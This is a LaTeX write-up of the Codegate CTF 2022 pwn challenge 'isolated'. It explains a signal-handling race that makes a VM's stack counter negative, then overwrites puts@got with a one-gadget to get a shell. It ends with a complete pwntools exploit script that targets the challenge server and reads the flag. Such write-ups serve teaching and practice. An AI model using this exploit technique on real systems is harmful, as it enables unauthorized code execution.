\documentclass{article}
\usepackage{float}
\usepackage{graphicx}
\usepackage{listings}

\author{Xiang Mei|xm2146@nyu.edu}
\title{Codegate CTF 2022 Preliminary/ isolated}
\begin{document}
\maketitle
\section{Prologue}

I played this CTF with my teamates @r3kapig, we ranked 10th(5330 points).
It's a pity that we need 28 pints more to get the tickets to the final. But
I really enjoy this CTF. I spent the whole day on this challenge, isolated.
Besides, I learned a lot about the linux signal and communication between porcesses.

\section{Intro to the challenge}
It's a simple challenge. It uses fork to get a child process
They use shared memory and signals to communicate with each 
other.

\paragraph{Parent Process}
It uses "signal" function to register several
signals, including SIGHUG, SIGINT, SIGQUIT, and SIGILL.
It replaces the original fucntions with our VM atomic 
operations, including PUSH, POP, CLEAN STACK, and LOG. 

\paragraph{Child Process}
The son child implements a VM and takes our inputs as code.
There is no vulnerability in the VM or the VM-atomic-operations.

In the vm we have two not-blocked-operations 
and 8 blocked-operations. blocked-operations would block 
until it gets the result from another process while 
the not-blocked ones don't care about the results.

\paragraph{PWN}
Our goal is to escape from the VM and get a shell. The 
venerability of this VM is that the linux signal is 
out-of-order and the handle-functions are not the 
atomic operations. 


\section{Solution}

\paragraph{Init}
I don't know if my guess is correct or not,
 because the debugging of multi-process challenge is
 intricate, I just had a try (atcually tons of tries) and it works!

\paragraph{Background}

It's out-of-order when the signal is 
processed and if the signals are processed in the
 following order we could get a negative stack counter.

\paragraph{My Guess}

We could split the POP handle function into 2 steps.

1. Check if the stack counter is less than 0

2. Decrese the stack counter

\paragraph{Trigger}
We can trigger the vulnerability by following steps.

1. Clean Stack to set stack counter to 0

2. Push Signal to set stack counter to 1

3. Signal-POP 1: pop-handle-step1

4. Signal-POP 2: pop-handle-step1

5. Signal-POP 1: step2

6. Signal-POP 2: step2

7. Get a negative stack counter

\paragraph{Get a shell}
The following exploitation is more straightforward.
 We could modify the got and use one-gadget to get
a shell. I tried printf@got but failed and 
I succeeded in hijacking put@got.

\section{Exploit}

\begin{lstlisting}
    from pwn import *
    def push(val):
        return p8(0)+p32(val)
    def pop():
        return b'\x01'
    def div(v1,v2):
        return p8(5)+b'f'+p32(v1)+b'f'+p32(v2)
    def log(v):
        return p8(10)+p8(0x66)+p32(v)
    def eee(idx,val):
        # cmp + je
        return p8(6)+b'U'+b'f'+p32(val)+p8(8)+b'f'+p32(idx)
    def eax(idx):
        # cmp + je
        return p8(6)+b'f'+p32(0)+b'U'+p8(8)+b'f'+p32(idx)
    def add(v1,v2):
        return p8(2)+b'f'+p32(v1)+b'f'+p32(v2)
    def safe_show2():
        return p8(6)+b'U'+b'U'
    def hangup(off):
        return p8(7)+p32(off)
    #context.log_level='debug'
    #p= process("./isolated")
    p=remote("3.38.234.54",7777)
    #p=remote("0.0.0.0",7777)
    sa = p.sendafter
    def loopn(n):
        res = b''
        for x in range(n):
            res+=safe_show2()
        return res
    pay  = log(1)+push(0)+log(1)+pop()+pop()+pop()+pop()
    pay += b'\x09'+eax(len(log(0)))
    pay += loopn(37-9)+p8(6)+b'Uf'+p32(0x132)
    pay += p8(2)+b'U'+b'f'+p32(0x8997c)+safe_show2()
    pay += log(1)+hangup(len(pay))
    
    sa("opcodes >",pay.ljust(0x300,b'\x0f'))
    sleep(1)
    p.read()
    p.send(b"cat flag*\n")
    p.interactive()

\end{lstlisting}

\end{document}